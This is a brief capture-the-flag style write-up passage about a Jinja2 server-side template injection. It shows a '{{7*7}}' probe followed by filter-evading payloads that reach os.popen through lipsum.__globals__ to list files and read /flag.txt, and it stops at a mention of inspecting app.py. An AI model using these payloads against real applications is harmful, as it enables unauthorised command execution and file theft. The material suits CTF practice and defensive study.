1. `{{7 * 7}}`
2. SSTI works so we just proceed to ls by
* **`ls`:**
    ```jinja2
    {{ lipsum.__globals__['o'+'s'].popen('l'+'s -a').read() }}
    ```
3. found `flag.txt` so we just did
* **`cat`:**
    ```jinja2
    {{lipsum.__globals__['o'+'s'].popen('ca'+'t /fl'+'ag.txt').read()}}
    ```
4. its empty tho. we look into the app.py 